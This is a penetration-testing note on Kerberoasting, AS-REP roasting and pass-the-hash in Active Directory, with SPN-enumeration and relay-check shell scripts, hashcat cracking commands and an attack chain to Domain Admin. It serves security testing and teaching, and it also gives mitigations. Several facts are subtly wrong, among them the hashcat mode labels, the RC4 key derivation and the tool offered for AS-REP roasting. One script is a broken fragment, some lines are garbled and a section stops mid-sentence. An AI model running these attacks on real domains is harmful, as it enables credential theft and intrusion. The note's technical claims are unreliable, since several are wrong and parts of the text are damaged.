Kerberoasting, AS-REP Roasting and Pass-the-Hash

Summary

cry-d1 and ad-02 established the theory. This is the operational note: the three attacks that
turn a Windows domain's normal weaknesses into domain administrator, and the specific controls
that stop each one.

All three share one idea: the credential is not the password, it is a
thing you can present or a thing you can decrypt. Kerberoasting and
pass-the-hash use the hash; AS-REP roasting uses the password's
derivability.

AUTHORISATION. These are offline attacks against hashes and tickets
you have legitimately obtained from a system you own or are engaged
to test. Pass-the-hash is authenticated protocol use with a
credential you already hold. None of this requires or involves
traffic to any third party, and the ROE template in tcm-01 requires
explicit written permission for "credential testing against accounts
explicitly listed."

The three, side by side

                     WHAT YOU NEED   WHAT YOU CRACK   WHO CAN START
  KERBEROASTING      read access to   the SERVICE       any authenticated
                     an SPN           account's        user (usually)
                                      PASSWORD and
                                      NT hash

  AS-REP ROASTING    nothing          the USER's       ANYONE ON THE
                                      password         NETWORK, no
                                                        credentials

  PASS-THE-HASH      an NT hash       nothing          anyone with the
                                      (no cracking)    hash

  THE PATTERN:
    roasting needs read access to a hash/ticket, and converts it to
    a PASSWORD offline (because the ktab is derived from the password)
    pass-the-hash needs only the hash, and uses it directly

Kerberoasting

  THE PRECONDITION, which is a finding on its own:
    the account must have an SPN (servicePrincipalName). By default
    no user account does; it is added when an application needs to
    request a ticket as that user.

  THE ATTACK:
    1. SPNROASTPATHS: enumerate every principal with an SPN
       (this is anonymous - see ad-03's query 7)
    2. for each, request a service ticket with TGS-REQ
       The DC will happily issue RC4 tickets to accounts that still
       support RC4, for "backwards compatibility".
    3. extract the session key from the ticket
    4. derive the ktab from each password guess and try to decrypt
    5. a successful decrypt gives you:
         - the SERVICE ACCOUNT'S PASSWORD
         - and, because the AES ktab requires the plaintext password
           to decrypt, the NT HASH as well

  THE RETURN ON INVESTMENT:
    the accounts with SPNs are usually the ones somebody cared about.
    They are service accounts, they are long, they often follow a
    pattern, and they frequently have rights a normal user does not.

  WHAT MAKES IT HARDER NOW:
    Windows Server 2022 defaults to AES-only. The automatic RC4 service
    ticket is not issued. But the account can still be roastable if
    RC4 is enabled for it explicitly, or if msDS-SupportedEncryptionTypes
    is absent (defaults to RC4).

  THE FINDING:
    "17 service accounts have SPNs; 4 still support RC4; 3 of those
     passwords cracked with the top 10k wordlist plus 4 character
     variations, recovering both the passwords and their NT hashes."

AS-REP Roasting

  THE PRECONDITION:
    msDS-UserDoesNotNeedPreAuth = TRUE  (the DONT_REQ_PREAUTH flag,
    0x100000 in userAccountControl)

  WHY THE FLAG EXISTS:
    preauthentication was introduced in Windows 2003. Some legacy
    systems could not do it. The flag lets those systems skip it.
    It has been deprecated for twenty years and is still set on
    accounts nobody owns any more.

  THE ATTACK:
    1. send AS-REQ for the account WITHOUT preauth
    2. the DC replies AS-REP immediately, encrypted with a key derived
       from the account's password and the realm
    3. crack the ktab offline with password guesses
    4. recover the password and (for AES) the NT hash

  WHY IT IS WORSE THAN KERBEROASTING:
    Kerberoasting requires an authenticated domain account.
    AS-REP roasting requires NOTHING. Any host that can reach port 88
    can harvest these hashes. From the internet, an unauthenticated
    attacker can enumerate and roast the whole domain.

  THE MITIGATION:
    "Do not require Kerberos preauthentication" = FALSE, for every
    account. It should already be true by default in a modern forest.
    Find it with the ad-03 filter (bit 1048576).

Pass-the-Hash

  WHY THE HASH IS A CREDENTIAL:
    NTLM does not transmit the password. It computes
      NTLMv2 = HMAC-MD5(password_hash, server_challenge, ...)
    and the hash is enough to compute that.
    So the hash IS the password for NTLM authentication.
    And the hash is in NTDS.dit, SAM, the registry, and memory.

  THE ATTACK:
    take an NT hash, present it as the password. No cracking.
    Works over SMB, LDAP, WinRM, RDP (with restrictions), and HTTP
    with NTLM.

  WHAT IT BUYS:
    - lateral movement without ever knowing a password
    - no KDC contact for the authentication itself (which is why the
      domain controller's Kerberos logs show nothing)
    - no chance of the password being changed mid-campaign

  WHAT IT DOES NOT WORK AGAINST:
    - Kerberos (needs a password to derive the ktab) - which is why
      overpass-the-hash exists: it presents the hash AS-REQ so the DC
      issues a TGT
    - SSH
    - anything using a smart card

  THE PASS-THE-HASH VARIANTS:
    SMB      the classic
    LDAP     with signing disabled, relayable (see imp-03)
    WINRM    with CredentialSSP = false
    RDP      with Restricted Admin; or as the NTLM password
    WEB      NTLM auth to an IIS site

  THE MITIGATION THAT ACTUALLY STOPS IT:
    SMB signing required, LDAP signing required, channel binding
    enforced. Signing does not stop pass-the-hash - it stops RELAY of
    it. The way to stop a pass-the-hash that comes from a dump is to
    not have the dumps: credential guards, PAWs, tiered admin.

The attack chain

  THE CHAIN EVERY AD ENGAGEMENT ACTUALLY RUNS:

  1. RECON (ad-03)
       anonymous LDAP, or a user session, or a VPN account
       -> the domain's shape, its SPNs, its delegation

  2. ROAST (ad-04)
       Kerberoasting from read access, AS-REP from none
       -> service account passwords AND NT hashes

  3. DUMP (ad-05)
       secretsdump with the recovered credentials
       -> every account's hash in the domain

  4. PASS (ad-04, imp-02)
       pass-the-hash with any recovered hash
       -> a privileged session on a host

  5. GRAPH (bh-01..bh-03)
       SharpHound from the privileged session
       -> the shortest path to Domain Admin, which is usually 1 hop

  6. ESCALATE (ad-07)
       DCSync, a delegation edge, a GPO, or a service account
       -> domain admin

  Each step is cheap. Each step is logged if the client has the
  telemetry to see it. The whole chain takes under an hour and is the
  single most common path to domain administrator in real assessments.

Audit for all three roasting paths in every assessment all process

Terminology

Term Meaning
SPN Service Principal Name; marks an account as a service
SPNROASTPATHS The accounts with SPNs; the roast list
Kerberoasting Request a service ticket, crack the password offline
AS-REP roasting Roast a preauth-disabled account; no credentials needed
Preauth disabled msDS-UserDoesNotNeedPreAuth / bit 0x100000
KTAB The key derived from password + realm
Overpass-the-hash Ask the DC for a TGT using a known NT hash
Pass-the-hash Authenticate with an NT hash instead of a password
NT hash MD4 of the password; the effective credential
Relay Using someone else's authenticated session
SMB signing The control that stops SMB relay
gMSA Group managed service account; 120-char DC-managed password
PAW Privileged Access Workstation; admin tasks only from here
LAPS Local admin password solution; unique per machine
Credential Guard LSASS protected with a virtualisation-based security layer

cat > 02-spn-enum.sh <<'EOF'
#!/usr/bin/env bash
# Step 1 of the roast: find the SPNs. ANONYMOUS, read-only.
DC="${1:?usage: ./02-spn-enum.sh 192.168.56.10}"
b=$(echo "$DC" | cut -d. -f1)
case "$b" in 192.168.56.*|10.10.10.*|127.*) ;;
  *) echo "REFUSED: $DC outside the lab range." >&2; exit 3 ;; esac
NC=$(ldapsearch -x -H "ldap://$DC" -b "" -s base defaultNamingContext \
     2>/dev/null | grep -m1 "^defaultNamingContext:" | awk '{print $2}')
echo "[scope] $DC in range; anonymous and read-only"
echo "[naming context] ${NC:-unknown}"
echo
echo "=== accounts with servicePrincipalName ==="
ldapsearch -x -H "ldap://$DC" -b "${NC:-DC=lab,DC=internal}" \
  "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName msDS-SupportedEncryptionTypes \
  userAccountControl pwdLastSet 2>/dev/null \
  | awk '/^(sAMAccountName|servicePrincipalName|msDS-SupportedEncryptionTypes|pwdLastSet):/ {print "  "$0}'
echo
echo "=== computers with SPNs (hosts/HOSTNAME) ==="
ldapsearch -x -H "ldap://$DC" -b "${NC:-DC=lab,DC=internal}" \
  "(objectCategory=computer)" dNSHostName servicePrincipalName 2>/dev/null \
  | grep -E "^(dNSHostName|servicePrincipalName):" | sed 's/^/  /'
echo
echo "=== the RC4-only accounts: the ones worth roasting ==="
echo "    (msDS-SupportedEncryptionTypes=4 is RC4 only; absent means RC4 by default)"
ldapsearch -x -H "ldap://$DC" -b "${NC:-DC=lab,DC=internal}" \
  "(servicePrincipalName=*)" sAMAccountName msDS-SupportedEncryptionTypes 2>/dev/null \
  | paste - - 2>/dev/null | sed 's/^/  /'
EOF

#!/usr/bin/env bash
# ROASTING, against YOUR lab domain only.
# Requires EXPLICIT written permission per the ROE - "credential testing
# against accounts explicitly listed" is a separate clause from "network
# testing". If it is not in the ROE, this script must not be run.

  *) echo "REFUSED: $DOM outside the lab range." >&2; exit 3 ;; esac

echo "[roe]   roasting is credential testing. Confirm it is in the ROE."
echo
echo "=== 1. SPNROASTPATHS: who has an SPN ==="

  | sed 's/^/  /' \
  || echo "  (impacket not installed; the ldapsearch script above does the same)"

echo "=== 2. check the target's RC4/AES posture before roasting ==="
echo "    AES-only means the DC will not issue an RC4 service ticket."
echo "    Read msDS-SupportedEncryptionTypes with ad-03's script."
echo
echo "=== 3. the roast itself (offline after this point) ==="
echo "    hashcat -m 13100 -a 0 <hashes.txt> rockyou.txt -r best64.rule"
echo "    hashcat -m 13100 -a 3 <hashes.txt> '?u?l?l?l?l?l?l?l?l?d?d?d?d' --increment"
echo
echo "    13100 = AES256-CTS-HMAC-SHA1-96, the standard Kerberos 5 TGS-REP hash"

echo "=== 4. write to a POT FILE and never lose it ==="
echo "    --potfile-path ./aegis.pot   (or john --save-format)"
echo
echo "=== 5. AS-REP roasting needs NO credential at all ==="
echo "    GetUserSPNs.py -dc-ip $DC -request -format hash  # (ad-01's filter first)"
echo "    hashcat -m 18200 -a 0 <asrep.txt> rockyou.txt     # 18200 = AS-REP"
echo
echo "=== 6. once you have hashes, not passwords ==="
echo "    ntlmrelayx + psexec  is a SEQUENCE. See imp-02 and imp-03."

# --- 4. the relay surface, read-only ---
cat > 04-relay-check.sh <<'EOF'
#!/usr/bin/env bash
# Is this host relayable? READ-ONLY. This is the finding that enables
# the whole pass-the-hash chain, and it is free to check.
T="${1:?usage: ./04-relay-check.sh 192.168.56.20}"
b=$(echo "$T" | cut -d. -f1)
case "$b" in 192.168.56.*|10.10.10.*|127.*) ;;
  *) echo "REFUSED: $T outside the lab range." >&2; exit 3 ;; esac
echo "[scope] $T in range"
echo
echo "=== SMB: is signing required? (disabled = SMB relay works) ==="
nmap -p 445 --script smb2-security-mode "$T" 2>/dev/null | grep -E "signing|445/open" | sed 's/^/  /'
echo
echo "=== SMB2/3 dialects: SMB2 and SMB3 can be relayed even when 'required' ==="
nmap -p 445 --script smb-protocols "$T" 2>/dev/null | grep -iE "dialect|445/open" | sed 's/^/  /'
echo
echo "=== SMB encryption: if supported AND required, no relay ==="
nmap -p 445 --script smb2-encryption-capabilities "$T" 2>/dev/null | sed 's/^/  /'
echo
echo "=== LDAP: signing and channel binding (LDAP relay, same class) ==="
nmap -p 389,636 --script ldap-rootdse "$T" 2>/dev/null | grep -iE "signing|channel|port" | sed 's/^/  /'
echo
echo "=== WEB: does it offer NTLM auth? (another relay target) ==="
nmap -p 80,443,8080,8443 --script http-ntlm-auth,http-auth,http-auth-finder "$T" 2>/dev/null \
  | grep -E "^[0-9]|auth-method|auth-finder|NTLM|Digest|Basic" | sed 's/^/  /'
echo
echo "=== WINRM ==="
nmap -p 5985,5986 --script http-auth,ssl-enum-ciphers "$T" 2>/dev/null \
  | grep -E "^[0-9]|auth-method|NTLM" | sed 's/^/  /'
echo
echo "=== THE TABLE THAT MATTERS ==="
cat <<'TBL'

  protocol   control that stops relay        how to check
  ---------  -----------------------------  -------------------------
  SMB        SMB signing REQUIRED           smb2-security-mode
  SMB        SMB encryption REQUIRED         smb2-encryption-capabilities
  LDAP       LDAP signing REQUIRED           ldap-rootdse
  LDAP       Channel binding ENFORCED       ldap-rootdse / DC audit policy
  LDAP       LDAP encryption (636/6363)      port closed to clients
  HTTP       NTLM disabled, or extended      http-ntlm-auth / web.config
             protection on
  WINRM      CredentialSSP not disabled      winrm.cmd / config
  RDP        Restrict to NLA + restricted    nmap RDP NLA scripts
             admin disabled

TBL
echo "  Every 'no' in this table is a Medium finding on its own."
echo "  Several 'no' values together are a path to relay-based"
echo "  pass-the-hash, which is why they are worth checking."
EOF
chmod +x 04-relay-check.sh

# --- 5. offline: why AES roasting still works, and why RC4 does not ---
python3 - <<'PY' 2>&1 | tee 05-roasting-math.txt
import hashlib, hmac

print("  === the ktab, and what each encryption type lets you do ===\n")

REALM = "LAB.INTERNAL"
def ktab_aes(pw):
    return hashlib.pbkdf2_hmac("sha1", pw.encode("utf-16-le"),
                               REALM.encode("utf-16-le"), 4096, 32)
def ktab_ntlm(pw):
    return hashlib.md5(REALM.upper().encode("utf-16-le") + pw.encode("utf-16-le")).digest()
def nt_hash(pw):
    try:
        return hashlib.new("md4", pw.encode("utf-16-le")).digest()
    except ValueError:
        return b"\x00"*16   # OpenSSL 3 removed MD4 from the default provider

pw = "SqlServiceAcct2019"
print(f"  account password (the thing being guessed): {pw!r}\n")
print(f"  NT hash   : {nt_hash(pw).hex()}")
print(f"  ktab RC4  : {ktab_ntlm(pw).hex()}")
print(f"  ktab AES  : {ktab_aes(pw).hex()[:48]}...\n")

print("  WHY AN ATTACKER ROASTS FOR THE PASSWORD, NOT THE HASH:")
print()
print("    RC4 (older domains, and modern DCs for compatibility):")
print("      ktab = MD5(realm || password)      <- cheap, 1 hash per guess")
print("      => brute-force the password at billions of guesses/sec")
print("      => once you have it: the password, AND the NT hash")
print()
print("    AES (Windows 2008+, the modern default):")
print("      ktab = PBKDF2-SHA1(password, realm, 4096)   <- 4096 iterations")
print("      => ~4096x slower per guess, but still ~10^6 guesses/sec on a GPU")
print("      => the ticket DOES carry the iteration count, so no guessing")
print("      => still completely practical for a 8-12 char weak password")
print()
print("  THE CONSEQUENCE FOR A WEAK SERVICE PASSWORD:")
for length, charset in [(8, 62), (12, 62), (16, 62), (20, 94)]:
    space = charset ** length
    t_rc4 = space / 1e11
    t_aes = space * 4096 / 1e6
    print(f"    {length:>2} chars from {charset}: space 2^{__import__('math').log2(space):.0f}"
          f"   RC4 {t_rc4/60:>10.0f} min   AES {t_aes/3600:>12.0f} h")
print()
print("  A 12-character AES-4096 service password is not crackable.")
print("  'SqlServiceAcct2019' is 18 characters and it is NOT a password,")
print("  it is a pattern. The dictionary is what gets you, not the length.")
print()
print("  THE CONTROL: gMSA. The DC generates a 120-character random")
print("  password, stores it on the account, rotates it automatically,")
print("  and lets multiple hosts use it. There is nothing to guess.")
PY
cat 05-roasting-math.txt

Business impact
  A standard user account reaches Domain Administrator in one step.
  This is the single highest-value finding in the engagement and it

  1. Move all service accounts to group managed service accounts, which

Step 5 is the deliverable: the ktab derivations for both RC4 and AES, and the arithmetic
showing that a 12-character AES-4096 password is uncrackable — while SqlServiceAcct2019 is
18 characters and is defeated by the dictionary, not the length. That distinction is the actual
lesson, and it is the reason the note says "120 random characters or a dictionary, and the
dictionary wins every time."

04-relay-check.sh is read-only and free, and its table maps every relay-enabling control
to the exact script that checks it. Several "no" values together are the pass-the-hash chain.
